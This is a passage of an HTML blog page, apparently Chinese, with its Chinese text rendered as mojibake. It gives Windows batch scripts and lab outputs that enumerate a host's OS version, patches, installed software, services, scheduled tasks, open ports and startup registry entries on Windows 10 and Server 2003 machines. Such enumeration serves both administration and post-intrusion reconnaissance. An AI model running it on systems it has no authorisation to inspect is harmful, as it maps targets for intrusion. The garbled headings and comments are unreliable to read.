class="line">Service Name: wscsvc</span><br><span class="line">Service Name: WSearch</span><br><span class="line">Service Name: wuauserv</span><br><span class="line">Service Name: cbdhsvc_12655d</span><br><span class="line">Service Name: CDPUserSvc_12655d</span><br><span class="line">Service Name: OneSyncSvc_12655d</span><br><span class="line">Service Name: WpnUserService_12655d</span><br><span class="line">==================================================</span><br><span class="line">[+] è·å–ä¸»æœºå¼€æ”¾ç«¯å£æœåŠ¡ä¿¡æ¯......</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       976</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       3920</span><br><span class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       6336</span><br><span class="line">  TCP    0.0.0.0:7890           0.0.0.0:0              LISTENING       10996</span><br><span class="line">  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       752</span><br><span class="line">  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       592</span><br><span class="line">  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1148</span><br><span class="line">  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1428</span><br><span class="line">  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2732</span><br><span class="line">  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       736</span><br><span class="line">  TCP    127.0.0.1:7890         127.0.0.1:54055        ESTABLISHED     10996</span><br><span class="line">  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       9832</span><br><span class="line">  TCP    127.0.0.1:8888         127.0.0.1:50504        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50049        0.0.0.0:0              LISTENING       10504</span><br><span class="line">  TCP    127.0.0.1:50050        0.0.0.0:0              LISTENING       10996</span><br><span class="line">  TCP    127.0.0.1:50050        127.0.0.1:50076        ESTABLISHED     10996</span><br><span class="line">  TCP    127.0.0.1:50065        127.0.0.1:50066        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50066        127.0.0.1:50065        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50076        127.0.0.1:50050        ESTABLISHED     10504</span><br><span class="line">  TCP    127.0.0.1:50482        127.0.0.1:50483        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50483        127.0.0.1:50482        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50491        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50491        127.0.0.1:50597        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50492        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50492        127.0.0.1:50515        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50492        127.0.0.1:50599        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50493        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50493        127.0.0.1:50600        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50494        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50495        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50495        127.0.0.1:50516        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50495        127.0.0.1:50598        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50496        127.0.0.1:50497        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50497        127.0.0.1:50496        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50498        127.0.0.1:50499        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50499        127.0.0.1:50498        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50500        127.0.0.1:50501        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50501        127.0.0.1:50500        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50502        127.0.0.1:50503        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50503        127.0.0.1:50502        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50504        127.0.0.1:8888         ESTABLISHED     9036</span><br><span class="line">  TCP    127.0.0.1:50515        127.0.0.1:50492        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50516        127.0.0.1:50495        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50520        127.0.0.1:50521        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50521        127.0.0.1:50520        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50522        127.0.0.1:50523        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50523        127.0.0.1:50522        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50524        127.0.0.1:50525        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50525        127.0.0.1:50524        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50526        127.0.0.1:50527        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50527        127.0.0.1:50526        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50528        127.0.0.1:50529        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50529        127.0.0.1:50528        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50530        127.0.0.1:50531        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50531        127.0.0.1:50530        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50532        127.0.0.1:50533        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50533        127.0.0.1:50532        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50534        127.0.0.1:50535        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50535        127.0.0.1:50534        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50536        127.0.0.1:50537        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50537        127.0.0.1:50536        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50538        0.0.0.0:0              LISTENING       5216</span><br><span class="line">  TCP    127.0.0.1:50539        127.0.0.1:50540        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50540        127.0.0.1:50539        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50541        127.0.0.1:50542        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50542        127.0.0.1:50541        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50543        127.0.0.1:50544        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50544        127.0.0.1:50543        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50545        127.0.0.1:50546        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50546        127.0.0.1:50545        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50547        127.0.0.1:50548        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50548        127.0.0.1:50547        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50549        127.0.0.1:50550        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50550        127.0.0.1:50549        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50587        127.0.0.1:50588        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50588        127.0.0.1:50587        ESTABLISHED     5216</span><br><span class="line">  TCP    127.0.0.1:50589        127.0.0.1:50590        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50590        127.0.0.1:50589        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50591        127.0.0.1:50592        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50592        127.0.0.1:50591        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50593        127.0.0.1:50594        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50594        127.0.0.1:50593        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50595        127.0.0.1:50596        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50596        127.0.0.1:50595        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50597        127.0.0.1:50491        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50598        127.0.0.1:50495        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50599        127.0.0.1:50492        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:50600        127.0.0.1:50493        ESTABLISHED     9832</span><br><span class="line">  TCP    127.0.0.1:54055        127.0.0.1:7890         ESTABLISHED     9036</span><br><span class="line">  TCP    127.0.0.1:57752        0.0.0.0:0              LISTENING       8444</span><br><span class="line">  TCP    127.0.0.1:63342        0.0.0.0:0              LISTENING       8308</span><br><span class="line">  TCP    192.168.181.141:139    0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:56811    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:56895    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:56990    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:57070    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:57095    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:7890   192.168.181.1:57097    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54026  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54039  58.254.149.166:443     ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54048  20.198.162.76:443      ESTABLISHED     3584</span><br><span class="line">  TCP    192.168.181.141:54049  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54056  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54057  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54061  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    192.168.181.141:54062  183.236.51.24:10001    ESTABLISHED     10996</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       976</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:7680              [::]:0                 LISTENING       6336</span><br><span class="line">  TCP    [::]:7890              [::]:0                 LISTENING       10996</span><br><span class="line">  TCP    [::]:49664             [::]:0                 LISTENING       752</span><br><span class="line">  TCP    [::]:49665             [::]:0                 LISTENING       592</span><br><span class="line">  TCP    [::]:49666             [::]:0                 LISTENING       1148</span><br><span class="line">  TCP    [::]:49667             [::]:0                 LISTENING       1428</span><br><span class="line">  TCP    [::]:49669             [::]:0                 LISTENING       2732</span><br><span class="line">  TCP    [::]:49672             [::]:0                 LISTENING       736</span><br><span class="line">  TCP    [::1]:8888             [::]:0                 LISTENING       9832</span><br><span class="line">==================================================</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure>



<h4 id="Win2003"><a href="#Win2003" class="headerlink" title="Win2003"></a>Win2003</h4><h5 id="è·å–ç³»ç»Ÿä¿¡æ¯ã€IPã€ä¿®å¤è¡¥ä¸ä¿¡æ¯"><a href="#è·å–ç³»ç»Ÿä¿¡æ¯ã€IPã€ä¿®å¤è¡¥ä¸ä¿¡æ¯" class="headerlink" title="è·å–ç³»ç»Ÿä¿¡æ¯ã€IPã€ä¿®å¤è¡¥ä¸ä¿¡æ¯"></a>è·å–ç³»ç»Ÿä¿¡æ¯ã€IPã€ä¿®å¤è¡¥ä¸ä¿¡æ¯</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> [+] ç³»ç»Ÿä¿¡æ¯:</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /i  /c:&quot;ä¸»æœºå&quot; /c:&quot;OS åç§°&quot; /c:&quot;OS ç‰ˆæœ¬&quot; </span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] IPåœ°å€:</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span> delims=:&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">ipconfig</span> ^| <span class="built_in">find</span> &quot;IP Address&quot;&#x27;) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] åˆ—å‡ºå·²å®‰è£…çš„ä¿®å¤è¡¥ä¸:</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /i /c:&quot;ä¿®è¡¥ç¨‹åº:&quot;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setlocal</span> EnableDelayedExpansion</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM è¿è¡Œ systeminfo å‘½ä»¤å¹¶å°†ç»“æœä¿å­˜åˆ°ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line">systeminfo &gt; systeminfo_output.txt</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM éå†æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="built_in">set</span> &quot;findPatch=false&quot;</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">1</span>,* delims=:&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">type</span> systeminfo_output.txt&#x27;) <span class="keyword">do</span> (</span><br><span class="line"><span class="comment">    REM æ‰¾åˆ°åŒ…å« &quot;ä¿®è¡¥ç¨‹åº&quot; çš„è¡Œ</span></span><br><span class="line">    <span class="keyword">if</span> &quot;<span class="variable">!findPatch!</span>&quot;==&quot;true&quot; (</span><br><span class="line"><span class="comment">        REM è¾“å‡ºå½“å‰è¡Œ</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">%%a</span>:<span class="variable">%%b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM æå–è¡Œä¸­çš„æ•°å­—</span></span><br><span class="line">        <span class="built_in">set</span> &quot;num=<span class="variable">%%b</span>&quot;</span><br><span class="line">        <span class="built_in">set</span> &quot;num=<span class="variable">!num:~1,1!</span>&quot;</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM è¾“å‡ºæ¥ä¸‹æ¥çš„ X è¡Œå†…å®¹</span></span><br><span class="line">        <span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">1</span>, <span class="variable">!num!</span>) <span class="keyword">do</span> (</span><br><span class="line">            <span class="built_in">set</span> /p &quot;outputLine=&quot;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">!outputLine!</span></span><br><span class="line">        )</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        REM è®¾ç½®æ ‡å¿—ä¸º falseï¼Œè¡¨ç¤ºä¸å†ç»§ç»­å¯»æ‰¾ &quot;ä¿®è¡¥ç¨‹åº&quot;</span></span><br><span class="line">        <span class="built_in">set</span> &quot;findPatch=false&quot;</span><br><span class="line">    )</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    REM æ‰¾åˆ° &quot;ä¿®è¡¥ç¨‹åº&quot; è¡Œï¼Œè®¾ç½®æ ‡å¿—ä¸º true</span></span><br><span class="line">    <span class="keyword">if</span> /i &quot;<span class="variable">%%a</span>&quot;==&quot;ä¿®è¡¥ç¨‹åº&quot; <span class="built_in">set</span> &quot;findPatch=true&quot;</span><br><span class="line">)</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM åˆ é™¤ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">del</span> systeminfo_output.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] ç³»ç»Ÿä¿¡æ¯:</span><br><span class="line">ä¸»æœºå:           TEST-C52232A016</span><br><span class="line">OS åç§°:          Microsoft(R) Windows(R) Server 2003, Enterprise Edition</span><br><span class="line">OS ç‰ˆæœ¬:          5.2.3790 Service Pack 2 Build 3790</span><br><span class="line">BIOS ç‰ˆæœ¬:        INTEL  - 6040000</span><br><span class="line">[+] IPåœ°å€:</span><br><span class="line"> 192.168.181.137</span><br><span class="line">[+] åˆ—å‡ºå·²å®‰è£…çš„ä¿®å¤è¡¥ä¸:</span><br><span class="line">ä¿®è¡¥ç¨‹åº:         å®‰è£…äº† 1 ä¸ªä¿®è¡¥ç¨‹åºã€‚</span><br><span class="line">                  [01]: Q147222</span><br></pre></td></tr></table></figure>



<h5 id="æŸ¥çœ‹å®‰è£…çš„åº”ç”¨"><a href="#æŸ¥çœ‹å®‰è£…çš„åº”ç”¨" class="headerlink" title="æŸ¥çœ‹å®‰è£…çš„åº”ç”¨"></a>æŸ¥çœ‹å®‰è£…çš„åº”ç”¨</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] åˆ—å‡º HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=*&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> &quot;subkey=<span class="variable">%%a</span>&quot;</span><br><span class="line">    <span class="built_in">set</span> &quot;display_name=&quot;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span>,*&quot; <span class="variable">%%b</span> <span class="keyword">in</span> (&#x27;reg query &quot;<span class="variable">!subkey!</span>&quot; /v DisplayName <span class="number">2</span>^&gt;<span class="built_in">nul</span> ^| <span class="built_in">find</span> &quot;REG_SZ&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">        <span class="built_in">set</span> &quot;display_name=<span class="variable">%%c</span>&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">defined</span> display_name (</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">!display_name!</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] åˆ—å‡º HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=*&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;reg query &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> &quot;subkey=<span class="variable">%%a</span>&quot;</span><br><span class="line">    <span class="built_in">set</span> &quot;display_name=&quot;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span>,*&quot; <span class="variable">%%b</span> <span class="keyword">in</span> (&#x27;reg query &quot;<span class="variable">!subkey!</span>&quot; /v DisplayName <span class="number">2</span>^&gt;<span class="built_in">nul</span> ^| <span class="built_in">find</span> &quot;REG_SZ&quot; <span class="number">2</span>^&gt;<span class="built_in">nul</span>&#x27;) <span class="keyword">do</span> (</span><br><span class="line">        <span class="built_in">set</span> &quot;display_name=<span class="variable">%%c</span>&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">defined</span> display_name (</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">!display_name!</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\æ¡Œé¢&gt;2.bat</span><br><span class="line">[+] åˆ—å‡º HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br><span class="line">Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148</span><br><span class="line">Python 3.4.4</span><br><span class="line">VMware Tools</span><br><span class="line">[+] åˆ—å‡º HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="æ­£åœ¨è¿è¡Œçš„æœåŠ¡-net-start"><a href="#æ­£åœ¨è¿è¡Œçš„æœåŠ¡-net-start" class="headerlink" title="æ­£åœ¨è¿è¡Œçš„æœåŠ¡ net start"></a>æ­£åœ¨è¿è¡Œçš„æœåŠ¡ net start</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> [+] å·²ç»å¯åŠ¨ä»¥ä¸‹ Windows æœåŠ¡:</span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> </span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] å·²ç»å¯åŠ¨ä»¥ä¸‹ Windows æœåŠ¡:</span><br><span class="line">--------------------------</span><br><span class="line">å·²ç»å¯åŠ¨ä»¥ä¸‹ Windows æœåŠ¡:</span><br><span class="line"></span><br><span class="line">   Application Experience Lookup Service</span><br><span class="line">   Automatic Updates</span><br><span class="line">   COM+ Event System</span><br><span class="line">   COM+ System Application</span><br><span class="line">   Computer Browser</span><br><span class="line">   Cryptographic Services</span><br><span class="line">   DCOM Server Process Launcher</span><br><span class="line">   DHCP Client</span><br><span class="line">   Distributed Link Tracking Client</span><br><span class="line">   Distributed Transaction Coordinator</span><br><span class="line">   DNS Client</span><br><span class="line">   Error Reporting Service</span><br><span class="line">   Event Log</span><br><span class="line">   Help and Support</span><br><span class="line">   IPSEC Services</span><br><span class="line">   Logical Disk Manager</span><br><span class="line">   Network Connections</span><br><span class="line">   Network Location Awareness (NLA)</span><br><span class="line">   Plug and Play</span><br><span class="line">   Print Spooler</span><br><span class="line">   Protected Storage</span><br><span class="line">   Remote Procedure Call (RPC)</span><br><span class="line">   Remote Registry</span><br><span class="line">   Secondary Logon</span><br><span class="line">   Security Accounts Manager</span><br><span class="line">   Server</span><br><span class="line">   Shell Hardware Detection</span><br><span class="line">   System Event Notification</span><br><span class="line">   Task Scheduler</span><br><span class="line">   TCP/IP NetBIOS Helper</span><br><span class="line">   Terminal Services</span><br><span class="line">   TP AutoConnect Service</span><br><span class="line">   VMware Alias Manager and Ticket Service</span><br><span class="line">   VMware Tools</span><br><span class="line">   VMware ç‰©ç†ç£ç›˜åŠ©æ‰‹æœåŠ¡</span><br><span class="line">   Windows Management Instrumentation</span><br><span class="line">   Windows Time</span><br><span class="line">   Wireless Configuration</span><br><span class="line">   Workstation</span><br><span class="line"></span><br><span class="line">å‘½ä»¤æˆåŠŸå®Œæˆã€‚</span><br><span class="line"></span><br><span class="line">--------------------------</span><br></pre></td></tr></table></figure>

<h5 id="è®¡åˆ’ä»»åŠ¡-1"><a href="#è®¡åˆ’ä»»åŠ¡-1" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> Listing Scheduled Tasks...</span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line">schtasks /query /fo table</span><br><span class="line"><span class="built_in">echo</span> --------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Listing Scheduled Tasks...</span><br><span class="line">--------------------------</span><br><span class="line">ä¿¡æ¯: ç³»ç»Ÿé‡Œæ²¡æœ‰è®¡åˆ’ä»»åŠ¡ã€‚</span><br><span class="line">--------------------------</span><br></pre></td></tr></table></figure>

<h5 id="å¼€æ”¾ç«¯å£-1"><a href="#å¼€æ”¾ç«¯å£-1" class="headerlink" title="å¼€æ”¾ç«¯å£"></a>å¼€æ”¾ç«¯å£</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Listing Open Ports...</span><br><span class="line"><span class="built_in">echo</span> ---------------------</span><br><span class="line">netstat -ano | <span class="built_in">find</span> &quot;LISTENING&quot;</span><br><span class="line"><span class="built_in">echo</span> ---------------------</span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Listing Open Ports...</span><br><span class="line">---------------------</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       716</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING       428</span><br><span class="line">  TCP    192.168.181.137:139    0.0.0.0:0              LISTENING       4</span><br><span class="line">---------------------</span><br></pre></td></tr></table></figure>

<h5 id="è‡ªå¯åŠ¨é¡¹-1"><a href="#è‡ªå¯åŠ¨é¡¹-1" class="headerlink" title="è‡ªå¯åŠ¨é¡¹"></a>è‡ªå¯åŠ¨é¡¹</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> Checking Registry Startup Items...</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="built_in">echo</span> [+] Current User Run:</span><br><span class="line">reg query &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="built_in">echo</span> [+] Current User RunOnce:</span><br><span class="line">reg query &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="built_in">echo</span> [+] Local Machine Run:</span><br><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"><span class="built_in">echo</span> [+] Local Machine RunOnce:</span><br><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; | <span class="built_in">findstr</span> /i &quot;REG_SZ&quot;</span><br><span class="line"><span class="built_in">echo</span> --------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Checking Registry Startup Items...</span><br><span class="line">--------------------------------</span><br><span class="line">[+] Current User Run:</span><br><span class="line">    ctfmon.exe    REG_SZ    C:\WINDOWS\system32\ctfmon.exe</span><br><span class="line">--------------------------------</span><br><span class="line">[+] Current User RunOnce:</span><br><span class="line">--------------------------------</span><br><span class="line">[+] Local Machine Run:</span><br><span class="line">    IMJPMIG8.1    REG_SZ    &quot;C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE&quot; /Spoil /RemAdvD</span><br><span class="line">ef /Migration32</span><br><span class="line">    IMEKRMIG6.1    REG_SZ    C:\WINDOWS\ime\imkr6_1\IMEKRMIG.EXE</span><br><span class="line">    PHIME2002ASync    REG_SZ    C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /S</span><br><span class="line">YNC</span><br><span class="line">    PHIME2002A    REG_SZ    C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /IMENa</span><br><span class="line">me</span><br><span class="line">    VMware User Process    REG_SZ    &quot;C:\Program Files\VMware\VMware Tools\vmtoo</span><br><span class="line">lsd.exe&quot; -n vmusr</span><br><span class="line">--------------------------------</span><br><span class="line">[+] Local Machine RunOnce:</span><br><span class="line">--------------------------------</span><br></pre></td></tr></table></figure>



